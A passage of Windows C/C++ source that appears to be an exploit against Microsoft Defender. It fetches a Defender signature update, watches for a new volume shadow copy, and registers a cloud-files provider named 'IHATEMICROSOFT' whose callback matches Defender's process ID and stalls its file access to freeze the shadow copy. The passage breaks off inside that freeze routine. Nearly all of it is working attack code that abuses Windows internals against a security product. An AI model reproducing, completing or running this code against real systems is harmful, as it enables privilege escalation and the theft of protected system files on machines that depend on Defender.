		DWORD buffsz = CabOpArgs->FileSize;
		current->filebuff = malloc(buffsz);
		memmove(current->filebuff, CabOpArgs->buff, buffsz);
		current->filesz = buffsz;
		LOG_INFO("CAB", "  Extracted file: %s (%d bytes)", CabOpArgs->filename, buffsz);
		CabOpArgs = CabOpArgs->next;
		if (CabOpArgs)
		{
			current->next = (UpdateFiles*)malloc(sizeof(UpdateFiles));
			ZeroMemory(current->next, sizeof(UpdateFiles));
			current = current->next;
		}

	}
	LOG_OK("CAB", "Cab file content extracted: %d files total", filecount ? *filecount : 0);


cleanup:

	if (CabOpArgs)
	{
		CabOpArguments* current = CabOpArgs->first;
		while (current)
		{
			free(current->buff);
			free(current->filename);
			CabOpArgs = current;
			current = current->next;
			free(CabOpArgs);
		}
	}
	if (hint)
		InternetCloseHandle(hint);
	
	if (hint2)
		InternetCloseHandle(hint2);
	if (exebuff)
		free(exebuff);

	return firstupdt;


}

bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
{
	IUpdateSearcher* updsrch = 0;
	bool updatesfound = false;
	IUpdateSession* updsess = 0;
	CLSID clsid;
	ISearchResult* srchres = 0;
	IUpdateCollection* updcollection = 0;
	LONG updnum = 0;
	BSTR title = 0;
	BSTR desc = 0;
	ICategoryCollection* catcoll = 0;
	ICategory* cat = 0;
	BSTR catname = 0;
	IUpdate* upd = 0;
	HRESULT hr = S_OK;
	bool comini = false;

	LOG_INFO("COM", "Initializing COM for WU API...");
	comini = (CoInitialize(NULL) == S_OK);
	if (!comini) {
		LOG_ERR("COM", "CoInitialize failed");
		*criterr = true;
		return false;
	}
	LOG_OK("COM", "CoInitialize succeeded");

	LOG_INFO("COM", "CLSIDFromProgID(Microsoft.Update.Session)...");
	hr = CLSIDFromProgID(OLESTR("Microsoft.Update.Session"), &clsid);
	if (FAILED(hr)) {
		LOG_HR("COM", hr, "CLSIDFromProgID failed");
		*criterr = true;
		goto cleanup;
	}
	LOG_OK("COM", "CLSID resolved");




	LOG_INFO("COM", "CoCreateInstance(IUpdateSession)...");
	hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IUpdateSession, (LPVOID*)&updsess);

	if (FAILED(hr) || !updsess)
	{
		LOG_HR("COM", hr, "CoCreateInstance returned NULL or failed");
		*criterr = true;
		goto cleanup;
	}
	LOG_OK("COM", "IUpdateSession created at 0x%p", (void*)updsess);


	LOG_INFO("COM", "Creating update searcher...");
	hr = updsess->CreateUpdateSearcher(&updsrch);
	if (FAILED(hr))
	{
		LOG_HR("COM", hr, "CreateUpdateSearcher failed");
		*criterr = true;
		goto cleanup;
	}

	if (!updsrch)
	{
		LOG_ERR("COM", "CreateUpdateSearcher returned NULL pointer");
		*criterr = true;
		goto cleanup;
	}
	LOG_OK("COM", "IUpdateSearcher created at 0x%p", (void*)updsrch);
	LOG_INFO("COM", "Searching for updates (this may take a while)...");
	hr = updsrch->Search(SysAllocString(L""), &srchres);
	if (FAILED(hr))
	{
		LOG_HR("COM", hr, "IUpdateSearcher::Search failed");
		*criterr = true;
		goto cleanup;
	}
	LOG_OK("COM", "Search completed, ISearchResult=0x%p", (void*)srchres);

	hr = srchres->get_Updates(&updcollection);
	if (FAILED(hr))
	{
		LOG_HR("COM", hr, "get_Updates failed");
		*criterr = true;
		goto cleanup;
	}

	if (!updcollection)
	{
		LOG_ERR("COM", "get_Updates returned NULL collection");
		*criterr = true;
		goto cleanup;
	}


	hr = updcollection->get_Count(&updnum);
	if (FAILED(hr))
	{
		LOG_HR("COM", hr, "get_Count failed");
		*criterr = true;
		goto cleanup;
	}
	LOG_INFO("COM", "Found %d pending updates, scanning for WD signature update...", updnum);

	for (LONG i = 0; i < updnum; i++)
	{
		if (upd)
		{
			upd->Release();
			upd = 0;
		}
		title = 0;
		desc = 0;
		catname = 0;
		bool IsWdUdpate = false;
		bool IsSigUpdate = false;

		LOG_INFO("COM", "────────────────────────────────────────");
		LOG_INFO("COM", "Processing update [%d/%d]...", i + 1, updnum);

		hr = updcollection->get_Item(i, &upd);
		if (FAILED(hr))
		{
			LOG_HR("COM", hr, "get_Item(%d) failed", i);
			*criterr = true;
			goto cleanup;
		}
		if (!upd)
		{
			LOG_ERR("COM", "get_Item(%d) returned NULL", i);
			*criterr = true;
			goto cleanup;
		}
		LOG_OK("COM", "  IUpdate[%d] acquired at 0x%p", i, (void*)upd);

		hr = upd->get_Title(&title);
		if (FAILED(hr))
		{
			LOG_HR("COM", hr, "get_Title failed for update %d", i);
			continue;
		}
		if (!title)
		{
			LOG_WARN("COM", "get_Title returned NULL for update %d", i);
			continue;
		}
		title[SysStringLen(title)] = NULL;
		LOG_INFO("COM", "  Title : %ws", title);

		{
			VARIANT_BOOL isInstalled = VARIANT_FALSE;
			VARIANT_BOOL isDownloaded = VARIANT_FALSE;
			VARIANT_BOOL isMandatory = VARIANT_FALSE;
			VARIANT_BOOL isHidden = VARIANT_FALSE;
			if (SUCCEEDED(upd->get_IsInstalled(&isInstalled)))
				LOG_INFO("COM", "  IsInstalled    : %s", isInstalled == VARIANT_TRUE ? "TRUE" : "FALSE");
			if (SUCCEEDED(upd->get_IsDownloaded(&isDownloaded)))
				LOG_INFO("COM", "  IsDownloaded   : %s", isDownloaded == VARIANT_TRUE ? "TRUE" : "FALSE");
			if (SUCCEEDED(upd->get_IsMandatory(&isMandatory)))
				LOG_INFO("COM", "  IsMandatory    : %s", isMandatory == VARIANT_TRUE ? "TRUE" : "FALSE");
			if (SUCCEEDED(upd->get_IsHidden(&isHidden)))
				LOG_INFO("COM", "  IsHidden       : %s", isHidden == VARIANT_TRUE ? "TRUE" : "FALSE");
		}

		{
			desc = 0;
			hr = upd->get_Description(&desc);
			if (SUCCEEDED(hr) && desc) {
				desc[SysStringLen(desc)] = NULL;
				LOG_INFO("COM", "  Description : %.200ws%s", desc, SysStringLen(desc) > 200 ? "..." : "");
				SysFreeString(desc);
				desc = 0;
			}
		}

		{
			IUpdateIdentity* identity = 0;
			hr = upd->get_Identity(&identity);
			if (SUCCEEDED(hr) && identity) {
				BSTR updateID = 0;
				LONG revNumber = 0;
				if (SUCCEEDED(identity->get_UpdateID(&updateID)) && updateID) {
					updateID[SysStringLen(updateID)] = NULL;
					LOG_INFO("COM", "  UpdateID : %ws", updateID);
					SysFreeString(updateID);
				}
				if (SUCCEEDED(identity->get_RevisionNumber(&revNumber))) {
					LOG_INFO("COM", "  RevisionNumber : %d", revNumber);
				}
				identity->Release();
			}
		}

		catcoll = 0;
		hr = upd->get_Categories(&catcoll);
		if (FAILED(hr) || !catcoll)
		{
			LOG_WARN("COM", "  get_Categories failed or returned NULL (hr=0x%08X) — skipping", (unsigned int)hr);
			continue;
		}
		LONG catcount = 0;
		hr = catcoll->get_Count(&catcount);
		if (FAILED(hr))
		{
			LOG_HR("COM", hr, "  get_Count on categories failed");
			continue;
		}
		LOG_INFO("COM", "  Categories count: %d", catcount);

		for (LONG j = 0; j < catcount; j++)
		{
			cat = 0;
			hr = catcoll->get_Item(j, &cat);
			if (FAILED(hr) || !cat)
			{
				LOG_WARN("COM", "    Category[%d]: get_Item failed or NULL (hr=0x%08X)", j, (unsigned int)hr);
				continue;
			}
			catname = 0;
			hr = cat->get_Name(&catname);
			if (FAILED(hr) || !catname)
			{
				LOG_WARN("COM", "    Category[%d]: get_Name failed or NULL (hr=0x%08X)", j, (unsigned int)hr);
				if (cat) cat->Release();
				continue;
			}
			catname[SysStringLen(catname)] = NULL;

			BSTR catID = 0;
			cat->get_CategoryID(&catID);
			if (catID) catID[SysStringLen(catID)] = NULL;

			LOG_INFO("COM", "    Category[%d]: Name=\"%ws\" | ID=%ws", j,
				catname ? catname : L"(null)",
				catID ? catID : L"(null)");

			if (catname)
			{
				bool matchWD = _wcsicmp(catname, L"Microsoft Defender Antivirus") == 0;
				bool matchSig = _wcsicmp(catname, L"Definition Updates") == 0;

				if (matchWD) {
					LOG_OK("COM", "    >>> MATCH: category is 'Microsoft Defender Antivirus'");
					IsWdUdpate = true;
				}
				if (matchSig) {
					LOG_OK("COM", "    >>> MATCH: category is 'Definition Updates'");
					IsSigUpdate = true;
				}
				if (!matchWD && !matchSig) {
					LOG_INFO("COM", "    (no match for WD criteria)");
				}
			}

			if (catID) SysFreeString(catID);
			cat->Release();
			cat = 0;
		}

		LOG_INFO("COM", "  Verdict: IsWdUpdate=%s, IsSigUpdate=%s",
			IsWdUdpate ? "TRUE" : "FALSE",
			IsSigUpdate ? "TRUE" : "FALSE");

		updatesfound = IsWdUdpate && IsSigUpdate;
		if (updatesfound) {
			LOG_OK("COM", "  *** WD signature update FOUND: %ws ***", title);
			break;
		}
		else {
			LOG_INFO("COM", "  Not a WD signature update, continuing...");
		}
	}

	if (!updatesfound)
		LOG_INFO("COM", "No WD signature update found among %d updates", updnum);

	if (updatesfound && updatetitle) {
		memmove(updatetitle, title, lstrlenW(title) * sizeof(wchar_t));
	}

cleanup:
	LOG_INFO("COM", "Releasing COM objects...");
	if (updcollection)
		updcollection->Release();
	if (srchres)
		srchres->Release();
	if (updsrch)
		updsrch->Release();
	if (updsess)
		updsess->Release();
	if (upd)
		upd->Release();
	CoUninitialize();
	LOG_OK("COM", "COM shutdown complete");


	return updatesfound;
}

//////////////////////////////////////////////////////////////////////
// WD definition update functions end
/////////////////////////////////////////////////////////////////////


//////////////////////////////////////////////////////////////////////
// Volume shadow copy functions
/////////////////////////////////////////////////////////////////////

void rev(char* s) {

	// Initialize l and r pointers
	int l = 0;
	int r = strlen(s) - 1;
	char t;

	// Swap characters till l and r meet
	while (l < r) {

		// Swap characters
		t = s[l];
		s[l] = s[r];
		s[r] = t;

		// Move pointers towards each other
		l++;
		r--;
	}
}

void DestroyVSSNamesList(LLShadowVolumeNames* First)
{
	while (First)
	{
		free(First->name);
		LLShadowVolumeNames* next = First->next;
		free(First);
		First = next;
	}
}

LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber, DWORD* errorcode)
{


	if (!criticalerr || !vscnumber || !errorcode)
		return NULL;

	*vscnumber = 0;
	ULONG scanctx = 0;
	ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
	ULONG retsz = 0;
	OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
	if (!objdirinfo)
	{
		LOG_ERR("VSS", "Failed to allocate %d bytes for NtQueryDirectoryObject buffer", reqsz);
		*criticalerr = true;
		*errorcode = ERROR_NOT_ENOUGH_MEMORY;
		return NULL;
	}
	ZeroMemory(objdirinfo, reqsz);
	NTSTATUS stat = STATUS_SUCCESS;
	LOG_INFO("VSS", "Querying \\Device directory for existing VSS volumes (initial buffer=%d bytes)...", reqsz);
	do
	{
		stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
		if (stat == STATUS_SUCCESS)
			break;
		else if (stat != STATUS_MORE_ENTRIES)
		{
			LOG_NT("VSS", stat, "NtQueryDirectoryObject failed during initial VSS enumeration");
			*criticalerr = true;
			*errorcode = RtlNtStatusToDosError(stat);
			return NULL;
		}

		free(objdirinfo);
		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
		LOG_INFO("VSS", "Buffer too small, growing to %d bytes...", reqsz);
		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
		if (!objdirinfo)
		{
			LOG_ERR("VSS", "Failed to allocate %d bytes for NtQueryDirectoryObject buffer", reqsz);
			*criticalerr = true;
			*errorcode = ERROR_NOT_ENOUGH_MEMORY;
			return NULL;
		}
		ZeroMemory(objdirinfo, reqsz);
	} while (1);
	void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
	LLShadowVolumeNames* LLVSScurrent = NULL;
	LLShadowVolumeNames* LLVSSfirst = NULL;
	for (ULONG i = 0; i < ULONG_MAX; i++)
	{
		if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
		{
			free(emptybuff);
			break;
		}
		if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
		{
			wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
			if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
			{
				if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
				{
					LOG_INFO("VSS", "  Found existing VSS: %ws", objdirinfo[i].Name.Buffer);
					(*vscnumber)++;
					if (LLVSScurrent)
					{
						LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
						if (!LLVSScurrent->next)
						{
							LOG_ERR("VSS", "malloc failed for LLShadowVolumeNames node");
							*criticalerr = true;
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
						LLVSScurrent = LLVSScurrent->next;
						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
						if (!LLVSScurrent->name)
						{
							LOG_ERR("VSS", "malloc failed for VSS name string");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
						memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
					}
					else
					{
						LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
						if (!LLVSSfirst)
						{
							LOG_ERR("VSS", "malloc failed for first LLShadowVolumeNames");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSSfirst, sizeof(LLShadowVolumeNames));
						LLVSScurrent = LLVSSfirst;
						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
						if (!LLVSScurrent->name)
						{
							LOG_ERR("VSS", "malloc failed for VSS name string");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
						memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);

					}

				}
			}
		}




	}
	free(objdirinfo);
	LOG_INFO("VSS", "Initial VSS enumeration complete: %d shadow copies found", *vscnumber);
	return LLVSSfirst;
}

DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
{

	wchar_t devicepath[] = L"\\Device";
	UNICODE_STRING udevpath = { 0 };
	RtlInitUnicodeString(&udevpath, devicepath);
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS stat = STATUS_SUCCESS;
	HANDLE hobjdir = NULL;
	DWORD retval = ERROR_SUCCESS;
	wchar_t newvsspath[MAX_PATH] = { 0 };
	wcscpy(newvsspath, L"\\Device\\");
	bool criterr = false;
	int vscnum = 0;
	bool restartscan = false;
	ULONG scanctx = 0;
	ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
	ULONG retsz = 0;
	OBJECT_DIRECTORY_INFORMATION* objdirinfo = NULL;
	bool srchfound = false;
	wchar_t vsswinpath[MAX_PATH] = { 0 };
	UNICODE_STRING _vsswinpath = { 0 };

	OBJECT_ATTRIBUTES objattr2 = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hlk = NULL;
	LLShadowVolumeNames* vsinitial = NULL;
	int scanIterations = 0;
	int retryCount = 0;

	LOG_INFO("VSSFIND", "Thread started. Opening \\Device object directory...");
	stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
	if (stat)
	{
		LOG_NT("VSSFIND", stat, "NtOpenDirectoryObject(\\Device) failed");
		retval = RtlNtStatusToDosError(stat);
		return retval;
	}
	LOG_OK("VSSFIND", "\\Device directory opened, handle=0x%p", (void*)hobjdir);

	void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
	if (!emptybuff)
	{
		LOG_ERR("VSSFIND", "malloc failed for empty comparison buffer");
		retval = ERROR_NOT_ENOUGH_MEMORY;
		goto cleanup;
	}
	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));

	LOG_INFO("VSSFIND", "Retrieving initial VSS snapshot list...");
	vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum,&retval);

	if (criterr)
	{
		LOG_ERR("VSSFIND", "RetrieveCurrentVSSList returned critical error, win32=%d", retval);
		goto cleanup;
	}
	if (!vsinitial)
	{
		LOG_WARN("VSSFIND", "No existing volume shadow copies found (baseline is empty)");
	}
	else
	{
		LOG_OK("VSSFIND", "Baseline established: %d existing volume shadow copies", vscnum);
		LLShadowVolumeNames* tmp = vsinitial;
		int idx = 0;
		while (tmp) {
			LOG_INFO("VSSFIND", "  Baseline[%d]: %ws", idx++, tmp->name);
			tmp = tmp->next;
		}
	}

	LOG_INFO("VSSFIND", "Starting scan loop for NEW shadow copy (not in baseline)...");

	stat = STATUS_SUCCESS;

scanagain:
	scanIterations++;
	if (scanIterations % 50 == 0) {
		LOG_INFO("VSSFIND", "  Scan iteration #%d, still searching...", scanIterations);
	}
	do
	{
		if (objdirinfo)
			free(objdirinfo);
		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
		if (!objdirinfo)
		{
			LOG_ERR("VSSFIND", "malloc(%d) failed for scan buffer", reqsz);
			retval = ERROR_NOT_ENOUGH_MEMORY;
			goto cleanup;
		}
		ZeroMemory(objdirinfo, reqsz);

		scanctx = 0;
		stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
		if (stat == STATUS_SUCCESS)
			break;
		else if (stat != STATUS_MORE_ENTRIES)
		{
			LOG_NT("VSSFIND", stat, "NtQueryDirectoryObject failed during scan (iteration #%d)", scanIterations);
			retval = RtlNtStatusToDosError(stat);
			goto cleanup;
		}
		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
	} while (1);



	for (ULONG i = 0; i < ULONG_MAX; i++)
	{
		if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
		{
			break;
		}
		if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
		{
			wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
			if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
			{
				if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
				{
					// check against the list if there this is a unique VS Copy
					LLShadowVolumeNames* current = vsinitial;
					bool found = false;
					while (current)
					{
						if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
						{
							found = true;
							break;
						}
						current = current->next;
					}
					if (found)
						continue;
					else
					{
						srchfound = true;
						wcscat(newvsspath, objdirinfo[i].Name.Buffer);
						LOG_OK("VSSFIND", "NEW shadow copy found: %ws (iteration #%d)", objdirinfo[i].Name.Buffer, scanIterations);
						break;
					}
				}
			}
		}
	}

	if (!srchfound) {
		restartscan = true;
		Sleep(100);
		goto scanagain;
	}
	if (objdirinfo) {
		free(objdirinfo);
		objdirinfo = NULL;
	}
	NtClose(hobjdir);
	hobjdir = NULL;



	LOG_OK("VSSFIND", "New volume shadow copy path: %ws", newvsspath);


	wcscpy(vsswinpath, newvsspath);
	wcscat(vsswinpath, L"\\Windows");
	RtlInitUnicodeString(&_vsswinpath, vsswinpath);
	InitializeObjectAttributes(&objattr2, &_vsswinpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	LOG_INFO("VSSFIND", "Verifying VSS accessibility: %ws", vsswinpath);
	retryCount = 0;
retry:
	retryCount++;
	stat = NtCreateFile(&hlk, FILE_READ_ATTRIBUTES, &objattr2, &iostat, NULL, NULL, NULL, FILE_OPEN, NULL, NULL, NULL);
	if (stat == STATUS_NO_SUCH_DEVICE) {
		if (retryCount % 100 == 0)
			LOG_WARN("VSSFIND", "  STATUS_NO_SUCH_DEVICE on attempt #%d, VSS not ready yet...", retryCount);
		Sleep(50);
		goto retry;
	}
	if (stat)
	{
		LOG_NT("VSSFIND", stat, "NtCreateFile(%ws) failed after %d retries", vsswinpath, retryCount);
		retval = RtlNtStatusToDosError(stat);
		goto cleanup;


	}
	LOG_OK("VSSFIND", "VSS verified accessible after %d retries", retryCount);
	CloseHandle(hlk);
	if (fullvsspath)
		wcscpy((wchar_t*)fullvsspath, newvsspath);


cleanup:
	if (hobjdir)
		NtClose(hobjdir);
	if (emptybuff)
		free(emptybuff);
	if (vsinitial)
		DestroyVSSNamesList(vsinitial);

	if (retval != ERROR_SUCCESS)
		LOG_ERR("VSSFIND", "Thread exiting with error=%d (0x%08X)", retval, retval);
	else
		LOG_OK("VSSFIND", "Thread exiting successfully");

	return retval;
}

DWORD GetWDPID()
{
	static DWORD retval = 0;
	if (retval)
		return retval;

	SC_HANDLE scmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (!scmgr)
		return 0;
	SC_HANDLE hsvc = OpenService(scmgr, L"WinDefend", SERVICE_QUERY_STATUS);
	CloseServiceHandle(scmgr);
	if (!hsvc)
		return 0;


	SERVICE_STATUS_PROCESS ssp = { 0 };
	DWORD reqsz = sizeof(ssp);
	bool res = QueryServiceStatusEx(hsvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, reqsz, &reqsz);
	CloseServiceHandle(hsvc);
	if (!res)
		return 0;
	retval = ssp.dwProcessId;
	return retval;

}

void CfCallbackFetchPlaceHolders(
	_In_ CONST CF_CALLBACK_INFO* CallbackInfo,
	_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
) {

	CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;
	wchar_t* procname = PathFindFileName(cpi->ImagePath);
	LOG_INFO("CLOUDF", "CfCallbackFetchPlaceholders triggered: caller=%ws (PID=%d), WD_PID=%d",
		procname, cpi->ProcessId, GetWDPID());
	if (GetWDPID() == cpi->ProcessId)
	{
		cldcallbackctx* ctx = (cldcallbackctx*)CallbackInfo->CallbackContext;
		SetEvent(ctx->hnotifywdaccess);;

		LOG_OK("CLOUDF", "Windows Defender process matched! PID=%d, image=%ws", cpi->ProcessId, cpi->ImagePath);
		CF_OPERATION_INFO cfopinfo = { 0 };
		cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
		cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
		cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
		cfopinfo.TransferKey = CallbackInfo->TransferKey;
		cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
		cfopinfo.RequestKey = CallbackInfo->RequestKey;
		//STATUS_CLOUD_FILE_REQUEST_TIMEOUT
		SYSTEMTIME systime = { 0 };
		FILETIME filetime = { 0 };
		GetSystemTime(&systime);
		SystemTimeToFileTime(&systime, &filetime);

		FILE_BASIC_INFO filebasicinfo = { 0 };
		filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
		CF_FS_METADATA fsmetadata = { filebasicinfo, {0x1000} };
		CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
		GUID uid = { 0 };
		RPC_WSTR wuid = { 0 };
		UuidCreate(&uid);
		UuidToStringW(&uid, &wuid);
		wchar_t* wuid2 = (wchar_t*)wuid;
		placeholder[0].RelativeFileName = ctx->filename;

		placeholder[0].FsMetadata = fsmetadata;

		UuidCreate(&uid);
		UuidToStringW(&uid, &wuid);
		wuid2 = (wchar_t*)wuid;
		placeholder[0].FileIdentity = wuid2;
		placeholder[0].FileIdentityLength = lstrlenW(wuid2) * sizeof(wchar_t);
		placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;


		CF_OPERATION_PARAMETERS cfopparams = { 0 };
		cfopparams.ParamSize = sizeof(cfopparams);
		cfopparams.TransferPlaceholders.PlaceholderCount = 1;
		cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 1;
		cfopparams.TransferPlaceholders.EntriesProcessed = 0;
		cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
		cfopparams.TransferPlaceholders.PlaceholderArray = placeholder;

		WaitForSingleObject(ctx->hnotifylockcreated, INFINITE);
		HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
		if (SUCCEEDED(hs))
			LOG_OK("CLOUDF", "CfExecute (WD branch) succeeded: hr=0x%08X", (unsigned)hs);
		else
			LOG_ERR("CLOUDF", "CfExecute (WD branch) FAILED: hr=0x%08X", (unsigned)hs);
		return;
	}
	CF_OPERATION_INFO cfopinfo = { 0 };
	cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
	cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
	cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
	cfopinfo.TransferKey = CallbackInfo->TransferKey;
	cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
	cfopinfo.RequestKey = CallbackInfo->RequestKey;
	CF_OPERATION_PARAMETERS cfopparams = { 0 };
	cfopparams.ParamSize = sizeof(cfopparams);
	cfopparams.TransferPlaceholders.PlaceholderCount = 0;
	cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 0;
	cfopparams.TransferPlaceholders.EntriesProcessed = 0;
	cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
	cfopparams.TransferPlaceholders.PlaceholderArray = { 0 };
	HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
	if (SUCCEEDED(hs))
		LOG_INFO("CLOUDF", "CfExecute (non-WD, empty placeholders) succeeded: hr=0x%08X", (unsigned)hs);
	else
		LOG_WARN("CLOUDF", "CfExecute (non-WD) returned hr=0x%08X", (unsigned)hs);

	return;


}

DWORD WINAPI FreezeVSS(void* arg)
{
	cloudworkerthreadargs* args = (cloudworkerthreadargs*)arg;
	if (!args)
		return ERROR_BAD_ARGUMENTS;

	HANDLE hlock = NULL;
	HRESULT hs;
	CF_SYNC_REGISTRATION cfreg = { 0 };
	cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
	cfreg.ProviderName = L"IHATEMICROSOFT";
	cfreg.ProviderVersion = L"1.0";
	CF_SYNC_POLICIES syncpolicy = { 0 };
	syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
	syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
	syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
	syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
	syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
	syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
	CF_CALLBACK_REGISTRATION callbackreg[2];
	callbackreg[0] = { CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS, CfCallbackFetchPlaceHolders };
	callbackreg[1] = { CF_CALLBACK_TYPE_NONE, NULL };
	CF_CONNECTION_KEY cfkey = { 0 };
	OVERLAPPED ovd = { 0 };
	DWORD nwf = 0;
	//wchar_t syncroot[] = L"C:\\temp";
	wchar_t syncroot[MAX_PATH] = { 0 };
	GetModuleFileName(GetModuleHandle(NULL), syncroot, MAX_PATH);
	*(PathFindFileName(syncroot) - 1) = L'\0';
	DWORD retval = STATUS_SUCCESS;
	wchar_t lockfile[MAX_PATH];
	wcscpy(lockfile, syncroot);
	wcscat(lockfile, L"\\");
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	UuidCreate(&uid);
	UuidToStringW(&uid, &wuid);
	wchar_t* wuid2 = (wchar_t*)wuid;
	wcscat(lockfile, wuid2);
	wcscat(lockfile, L".lock");
	cldcallbackctx callbackctx = { 0 };
	bool syncrootregistered = false;
	callbackctx.hnotifywdaccess = CreateEvent(NULL, FALSE, FALSE, NULL);
	callbackctx.hnotifylockcreated = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!callbackctx.hnotifylockcreated || !callbackctx.hnotifywdaccess)
	{
		LOG_ERR("FREEZEVSS", "CreateEvent failed: hnotifylockcreated=0x%p hnotifywdaccess=0x%p",
			(void*)callbackctx.hnotifylockcreated, (void*)callbackctx.hnotifywdaccess);
		retval = GetLastError();
		goto cleanup;
	}
	wcscpy(callbackctx.filename, wuid2);
	wcscat(callbackctx.filename, L".lock");
	hlock = CreateFile(lockfile, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (!hlock || hlock == INVALID_HANDLE_VALUE)
	{
		LOG_ERR("FREEZEVSS", "CreateFile(%ws) failed", lockfile);
		retval = GetLastError();
		goto cleanup;
	}
